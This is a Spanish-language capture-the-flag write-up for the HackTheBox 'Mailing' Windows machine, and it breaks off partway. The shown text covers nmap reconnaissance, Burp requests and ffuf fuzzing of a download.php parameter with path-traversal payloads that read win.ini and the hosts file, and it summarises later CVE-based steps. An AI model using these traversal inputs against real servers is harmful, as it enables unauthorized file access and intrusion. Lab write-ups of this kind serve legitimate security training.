<!doctype html><html lang=es><head><title>HTB Mailing WriteUp ¬∑ gunzf0x
</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="gunzf0x"><meta name=description content="HackThebox 'Mailing' WriteUp"><meta name=keywords content="blog,pentesting,hacking"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB Mailing WriteUp"><meta name=twitter:description content="HackThebox 'Mailing' WriteUp"><meta property="og:url" content="https://gunzf0x.github.io/pentesting/es/posts/mailing/"><meta property="og:site_name" content="gunzf0x"><meta property="og:title" content="HTB Mailing WriteUp"><meta property="og:description" content="HackThebox 'Mailing' WriteUp"><meta property="og:locale" content="es"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-09-07T00:00:00+00:00"><meta property="article:modified_time" content="2024-09-07T00:00:00+00:00"><meta property="article:tag" content="HTB"><meta property="article:tag" content="Machine"><meta property="article:tag" content="Windows"><meta property="article:tag" content="Easy"><meta property="article:tag" content="Hmailserver"><meta property="article:tag" content="Netexec"><link rel=canonical href=https://gunzf0x.github.io/pentesting/es/posts/mailing/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/pentesting/css/coder.min.577e3c5ead537873430da16f0964b754a120fd87c4e2203a00686e7c75b51378.css integrity="sha256-V348Xq1TeHNDDaFvCWS3VKEg/YfE4iA6AGhufHW1E3g=" crossorigin=anonymous media=screen><link rel=stylesheet href=/pentesting/css/coder-dark.min.b587cb1f00f2309d3943f06d512873c8c174188c45cb8406de0bfe6523023297.css integrity="sha256-tYfLHwDyMJ05Q/BtUShzyMF0GIxFy4QG3gv+ZSMCMpc=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=any><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/pentesting/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/pentesting/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/pentesting/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/pentesting/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/pentesting/es>gunzf0x
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/pentesting/es/about/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/posts/>Blog/WriteUps</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/projects/>Proyectos</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/contact/>Contacto</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=/pentesting/posts/mailing/>üá¨üáß</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://gunzf0x.github.io/pentesting/es/posts/mailing/>HTB Mailing WriteUp</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
<time datetime=2024-09-07T00:00:00Z>7 septiembre, 2024
</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
17 minutos de lectura.</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
<span class=tag><a href=/pentesting/es/tags/htb/>HTB</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/machine/>Machine</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/windows/>Windows</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/easy/>Easy</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/hmailserver/>Hmailserver</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/netexec/>Netexec</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/evil-winrm/>Evil-Winrm</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/john/>John</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/brute-force-password-cracking/>Brute Force Password Cracking</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/libreoffice/>Libreoffice</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/impacket/>Impacket</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/responder/>Responder</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/python/>Python</a></span></div></div></header><div class=post-content><h1 id=mailing----hackthebox>Mailing &ndash; HackTheBox
<a class=heading-link href=#mailing----hackthebox><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><ul><li>OS: <em>Windows</em></li><li>Difficulty / Dificultad: <em>Easy</em> / <em>F√°cil</em></li><li>Platform / Plataforma: <em>HackTheBox</em></li></ul><p><img alt="&lsquo;Mailing&rsquo; Avatar" src=/pentesting/images/Mailing_avatar.png></p><hr><h2 id=resumen>Resumen
<a class=heading-link href=#resumen><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p><code>Mailing</code> es una m√°quina de dificultad f√°cil de la plataforma <code>HackTheBox</code>. Luego de performar un escaneo inicial con <code>Nmap</code>, somos capaces de ver que la m√°quina v√≠ctima est√° corriendo un servicio web. Encontramos un recurso en esta p√°gina web que es vulnerable a <code>Local File Inclusion</code>, lo que nos permite leer un archivo de configuraci√≥n de un servicio and extract y extraer una contrase√±a para este servicio. Abusando de la vunlerabilidad <a href=https://nvd.nist.gov/vuln/detail/CVE-2024-21413 class=external-link target=_blank rel=noopener>CVE-2024-21413</a>, enviamos m√∫ltiples mails maliciosos; con esto somos capaces de leer el hash NTLMv2 de uno de los usuarios que abre uno de los mails maliciosos y somos capaces de crackear su contrase√±a. Este usuario es capaz de conectarse a trav√©s del servicio <code>WinRM</code> en la m√°quina v√≠ctima, lo cual nos permite ganar acceso inicial a √©sta. Una vez dentro, podemos ver que hay un directorio ejecutando/abriendo archivos <code>.odt</code>. Es entonces que usamos la vulnerabilidad <a href=https://nvd.nist.gov/vuln/detail/CVE-2023-2255 class=external-link target=_blank rel=noopener>CVE-2023-2255</a> para inyectar c√≥digo en archivos <code>.odt</code> los cuales est√°n siendo ejecutados. Este c√≥digo est√° siendo privilegiado por un usuario privilegiado del sistema, lo que finalmente nos permite ganar control total sobre √©ste.</p><hr><h2 id=user--usuario>User / Usuario
<a class=heading-link href=#user--usuario><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p>Empezando con un escaneo con <code>Nmap</code> nos muestra m√∫ltiples puertos abiertos: <code>25</code> <code>Simple Mail Transfer Protocol</code> (<code>SMTP</code>), <code>80</code> <code>HTTP</code> (corriendo <code>Microsoft IIS</code>), <code>110</code> <code>Post Office Protocol</code> (<code>POP3</code>), <code>135</code> <code>Microsoft RPC</code>, <code>143</code> <code>Internet Message Access Protocol</code> (<code>IMAP</code>), <code>445</code> <code>Server Message Block</code> (<code>SMB</code>), <code>465</code>, <code>587</code> <code>hMailServer</code> y <code>5985</code> <code>Windows Remote Management</code> (<code>WinRM</code>):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sS --open -p- --min-rate=5000 -n -Pn -vvv 10.10.11.14
</span></span></span></code></pre></div><p>Aplicando scripts de reconocimientos y escaneo de versiones, tenemos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sVC -p25,80,110,135,139,143,445,465,587,993,5040,5985,7680,47001,49664,49665,49666,49667,49668,49669 10.10.11.14 
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-02 21:10 -04
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.10.11.14
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.28s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT      STATE SERVICE       VERSION
</span></span></span><span class=line><span class=cl><span class=go>25/tcp    open  smtp          hMailServer smtpd
</span></span></span><span class=line><span class=cl><span class=go>| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
</span></span></span><span class=line><span class=cl><span class=go>|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
</span></span></span><span class=line><span class=cl><span class=go>80/tcp    open  http          Microsoft IIS httpd 10.0
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Microsoft-IIS/10.0
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Did not follow redirect to http://mailing.htb
</span></span></span><span class=line><span class=cl><span class=go>110/tcp   open  pop3          hMailServer pop3d
</span></span></span><span class=line><span class=cl><span class=go>|_pop3-capabilities: USER UIDL TOP
</span></span></span><span class=line><span class=cl><span class=go>135/tcp   open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span></span><span class=line><span class=cl><span class=go>143/tcp   open  imap          hMailServer imapd
</span></span></span><span class=line><span class=cl><span class=go>|_imap-capabilities: IDLE CHILDREN IMAP4rev1 SORT completed CAPABILITY QUOTA IMAP4 OK RIGHTS=texkA0001 ACL NAMESPACE
</span></span></span><span class=line><span class=cl><span class=go>445/tcp   open  microsoft-ds?
</span></span></span><span class=line><span class=cl><span class=go>465/tcp   open  ssl/smtp      hMailServer smtpd
</span></span></span><span class=line><span class=cl><span class=go>|_ssl-date: TLS randomness does not represent time
</span></span></span><span class=line><span class=cl><span class=go>| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
</span></span></span><span class=line><span class=cl><span class=go>| Not valid before: 2024-02-27T18:24:10
</span></span></span><span class=line><span class=cl><span class=go>|_Not valid after:  2029-10-06T18:24:10
</span></span></span><span class=line><span class=cl><span class=go>| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
</span></span></span><span class=line><span class=cl><span class=go>|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
</span></span></span><span class=line><span class=cl><span class=go>587/tcp   open  smtp          hMailServer smtpd
</span></span></span><span class=line><span class=cl><span class=go>|_ssl-date: TLS randomness does not represent time
</span></span></span><span class=line><span class=cl><span class=go>| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
</span></span></span><span class=line><span class=cl><span class=go>|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
</span></span></span><span class=line><span class=cl><span class=go>| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
</span></span></span><span class=line><span class=cl><span class=go>| Not valid before: 2024-02-27T18:24:10
</span></span></span><span class=line><span class=cl><span class=go>|_Not valid after:  2029-10-06T18:24:10
</span></span></span><span class=line><span class=cl><span class=go>993/tcp   open  ssl/imap      hMailServer imapd
</span></span></span><span class=line><span class=cl><span class=go>| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
</span></span></span><span class=line><span class=cl><span class=go>| Not valid before: 2024-02-27T18:24:10
</span></span></span><span class=line><span class=cl><span class=go>|_Not valid after:  2029-10-06T18:24:10
</span></span></span><span class=line><span class=cl><span class=go>|_imap-capabilities: IDLE CHILDREN IMAP4rev1 SORT completed CAPABILITY QUOTA IMAP4 OK RIGHTS=texkA0001 ACL NAMESPACE
</span></span></span><span class=line><span class=cl><span class=go>|_ssl-date: TLS randomness does not represent time
</span></span></span><span class=line><span class=cl><span class=go>5040/tcp  open  unknown
</span></span></span><span class=line><span class=cl><span class=go>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Not Found
</span></span></span><span class=line><span class=cl><span class=go>7680/tcp  open  pando-pub?
</span></span></span><span class=line><span class=cl><span class=go>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Not Found
</span></span></span><span class=line><span class=cl><span class=go>49664/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49665/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49666/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49667/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49668/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49669/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Host script results:
</span></span></span><span class=line><span class=cl><span class=go>| smb2-time:
</span></span></span><span class=line><span class=cl><span class=go>|   date: 2024-06-03T01:13:13
</span></span></span><span class=line><span class=cl><span class=go>|_  start_date: N/A
</span></span></span><span class=line><span class=cl><span class=go>| smb2-security-mode:
</span></span></span><span class=line><span class=cl><span class=go>|   3:1:1:
</span></span></span><span class=line><span class=cl><span class=go>|_    Message signing enabled but not required
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=go>Nmap done: 1 IP address (1 host up) scanned in 215.54 seconds
</span></span></span></code></pre></div><p>Del escaneo, puedo ver que <code>http://10.10.11.14</code> redirige a <code>http://mailing.htb</code>, de manera que agrego este dominio a mi archivo <code>/etc/hosts</code> corriendo:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ echo &#39;10.10.11.14 mailing.htb&#39; | sudo tee -a /etc/hosts
</span></span></span></code></pre></div><p>Visitando <code>http://mailing.htb</code> nos presenta un sitio web el cual habla sobre estafas y amenazas de phishing que ocurren pueden ocurrir mediante servicios de mail. El sitio web dice que utiliza como servicio <code>hMailServer</code>:</p><div class="notice info"><div class=notice-title><i class="fa-solid fa-exclamation-circle" aria-hidden=true></i>Informaci√≥n</div><div class=notice-content><code>hMailServer</code> is a free, open source, e-mail server for <code>Windows|Microsoft Windows</code>. It&rsquo;s used by Internet service providers, companies, governments, schools and enthusiasts in all parts of the world.
It supports the common e-mail protocols (<code>IMAP</code>, <code>SMTP</code> and <code>POP3</code>) and can easily be integrated with many existing web mail systems. It has flexible score-based spam protection and can attach to your virus scanner to scan all incoming and outgoing email.</div></div><p>En resumen, es una herramienta para securizar los mails.</p><p><img alt="Mailing 1" src=/pentesting/images/Mailing_1.png></p><p>Si vamos a la parte inferior de la p√°gina web, podemos ver un bot√≥n que dice <code>Download Instructions</code>. Si lo clickeamos, √©ste descarga un archivo llamado <code>instructions.pdf</code>. Tal cual dice el nombre del archivo, √©ste muestra instrucciones de c√≥mo instalar <code>hMailServer</code> en sistemas operativos <code>Windows</code> y <code>Linux</code>.</p><p><img alt="Mailing 2" src=/pentesting/images/Mailing_2.png></p><p>Cuando pongo my mouse sobre <code>Download Instructions</code> puedo ver que √©ste lleva a la ruta <code>mailing.htb/download.php?file=instructions.pdf</code>. Decido entonces ver qu√© es lo que ocurre cuando descargamos el instructivo interceptando la petici√≥n con <code>Burpsuite</code>. Interceptando el request, tenemos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/download.php?file=instructions.pdf</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>mailing.htb</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>en-US,en;q=0.5</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://mailing.htb/</span>
</span></span><span class=line><span class=cl><span class=n>Dnt</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Dest</span><span class=o>:</span> <span class=l>document</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Mode</span><span class=o>:</span> <span class=l>navigate</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Site</span><span class=o>:</span> <span class=l>cross-site</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-User</span><span class=o>:</span> <span class=l>?1</span>
</span></span><span class=line><span class=cl><span class=n>Te</span><span class=o>:</span> <span class=l>trailers</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span></code></pre></div><p>Env√≠o esta petici√≥n al <code>Repeater</code>, me aseguro de que est√© enviando peticiones a <code>HTTP</code> en lugar de <code>HTTPs</code> (clickeando, en el <code>Repeater</code>, en la parte superior derecha en el √≠cono de l√°piz y deseleccionando la opci√≥n <code>Use HTTPs</code>). Por ejemplo, si buscamos por un directorio que claramente no existe en el sistema obtenemos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/test</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>mailing.htb</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>en-US,en;q=0.5</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://mailing.htb/</span>
</span></span><span class=line><span class=cl><span class=n>Dnt</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Dest</span><span class=o>:</span> <span class=l>document</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Mode</span><span class=o>:</span> <span class=l>navigate</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Site</span><span class=o>:</span> <span class=l>cross-site</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-User</span><span class=o>:</span> <span class=l>?1</span>
</span></span><span class=line><span class=cl><span class=n>Te</span><span class=o>:</span> <span class=l>trailers</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span></code></pre></div><p>Obtenemos el c√≥digo de error <code>404: archivo o directorio no encontrado</code>.</p><p><img alt="Mailing 3" src=/pentesting/images/Mailing_3.png></p><p>Si buscamos en la petici√≥n que descargaba el instructivo, pero ahora por un archivo que no existe, el servidor nos devuelve <code>File not found.</code>:</p><p><img alt="Mailing 4" src=/pentesting/images/Mailing_4.png></p><p>Entonces es que veremos si el par√°metro <code>file</code> de la petici√≥n es vulnerable a <code>Local File Inclusion</code> (<code>LFI</code>). Descargo una &ldquo;lista de payloads de LFI&rdquo; desde <a href=https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt class=external-link target=_blank rel=noopener>este repositorio de Github</a>. Luego, uso la herramienta <code>ffuf</code> para empezar a buscar por respuestas <code>HTTP</code> v√°lidas. Luego de filtrar por algunos falsos positivos, obtenemos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ffuf -X GET -w LFI_payloads.txt -u &#39;http://mailing.htb/download.php?file=FUZZ&#39; -fw 3,71 -t 55
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>        /&#39;___\  /&#39;___\           /&#39;___\
</span></span></span><span class=line><span class=cl><span class=go>       /\ \__/ /\ \__/  __  __  /\ \__/
</span></span></span><span class=line><span class=cl><span class=go>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
</span></span></span><span class=line><span class=cl><span class=go>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
</span></span></span><span class=line><span class=cl><span class=go>         \ \_\   \ \_\  \ \____/  \ \_\
</span></span></span><span class=line><span class=cl><span class=go>          \/_/    \/_/   \/___/    \/_/
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>       v2.1.0-dev
</span></span></span><span class=line><span class=cl><span class=go>________________________________________________
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> :: Method           : GET
</span></span></span><span class=line><span class=cl><span class=go> :: URL              : http://mailing.htb/download.php?file=FUZZ
</span></span></span><span class=line><span class=cl><span class=go> :: Wordlist         : FUZZ: /home/gunzf0x/HTB/HTBMachines/Easy/Mailing/content/LFI_payloads.txt
</span></span></span><span class=line><span class=cl><span class=go> :: Follow redirects : false
</span></span></span><span class=line><span class=cl><span class=go> :: Calibration      : false
</span></span></span><span class=line><span class=cl><span class=go> :: Timeout          : 10
</span></span></span><span class=line><span class=cl><span class=go> :: Threads          : 55
</span></span></span><span class=line><span class=cl><span class=go> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
</span></span></span><span class=line><span class=cl><span class=go> :: Filter           : Response words: 3,71
</span></span></span><span class=line><span class=cl><span class=go>________________________________________________
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>\..\..\..\WINDOWS\win.ini [Status: 200, Size: 92, Words: 6, Lines: 8, Duration: 157ms]
</span></span></span><span class=line><span class=cl><span class=go>\..\..\WINDOWS\win.ini  [Status: 200, Size: 92, Words: 6, Lines: 8, Duration: 158ms]
</span></span></span><span class=line><span class=cl><span class=go>\..\..\..\..\WINDOWS\win.ini [Status: 200, Size: 92, Words: 6, Lines: 8, Duration: 154ms]
</span></span></span><span class=line><span class=cl><span class=go>\..\..\..\..\..\..\WINDOWS\win.ini [Status: 200, Size: 92, Words: 6, Lines: 8, Duration: 154ms]
</span></span></span><span class=line><span class=cl><span class=go></span><span class=gp>%</span>5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69 <span class=o>[</span>Status: 200, Size: 92, Words: 6, Lines: 8, Duration: 154ms<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=gp>%</span>5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69 <span class=o>[</span>Status: 200, Size: 92, Words: 6, Lines: 8, Duration: 158ms<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=go>\..\..\..\..\..\WINDOWS\win.ini [Status: 200, Size: 92, Words: 6, Lines: 8, Duration: 158ms]
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>\\\..\..\..\..\..\..\windows\\\system32\\\drivers\\\etc\\\hosts [Status: 200, Size: 849, Words: 172, Lines: 24, Duration: 162ms]
</span></span></span><span class=line><span class=cl><span class=go>../../windows/win.ini   [Status: 200, Size: 92, Words: 6, Lines: 8, Duration: 160ms]
</span></span></span><span class=line><span class=cl><span class=go>\..\..\..\WINDOWS\win.ini [Status: 200, Size: 92, Words: 6, Lines: 8, Duration: 158ms]
</span></span></span><span class=line><span class=cl><span class=go>\..\..\WINDOWS\win.ini  [Status: 200, Size: 92, Words: 6, Lines: 8, Duration: 158ms]
</span></span></span><span class=line><span class=cl><span class=go>\..\..\..\..\WINDOWS\win.ini [Status: 200, Size: 92, Words: 6, Lines: 8, Duration: 162ms]
</span></span></span><span class=line><span class=cl><span class=go>\..\..\..\..\..\WINDOWS\win.ini [Status: 200, Size: 92, Words: 6, Lines: 8, Duration: 162ms]
</span></span></span><span class=line><span class=cl><span class=go></span><span class=gp>%</span>5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69 <span class=o>[</span>Status: 200, Size: 92, Words: 6, Lines: 8, Duration: 149ms<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=gp>%</span>5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69 <span class=o>[</span>Status: 200, Size: 92, Words: 6, Lines: 8, Duration: 150ms<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=gp>%</span>5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69 <span class=o>[</span>Status: 200, Size: 92, Words: 6, Lines: 8, Duration: 150ms<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=go>\..\..\..\..\..\..\WINDOWS\win.ini [Status: 200, Size: 92, Words: 6, Lines: 8, Duration: 150ms]
</span></span></span><span class=line><span class=cl><span class=go></span><span class=gp>%</span>5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69 <span class=o>[</span>Status: 200, Size: 92, Words: 6, Lines: 8, Duration: 159ms<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=gp>%</span>5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69 <span class=o>[</span>Status: 200, Size: 92, Words: 6, Lines: 8, Duration: 153ms<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=go>:: Progress: [70466/70466] :: Job [1/1] :: 303 req/sec :: Duration: [0:03:29] :: Errors: 6 ::
</span></span></span></code></pre></div><p>Por ejemplo, si elijo el payload <code>\\\..\..\..\windows\\\system32\\\drivers\\\etc\\\hosts</code> y lo paso al par√°metro <code>file</code> de <code>download.php</code> en <code>Burpsuite</code> obtenemos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/download.php?file=\\\..\..\..\windows\\\system32\\\drivers\\\etc\\\hosts</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>mailing.htb</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>en-US,en;q=0.5</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br</span>
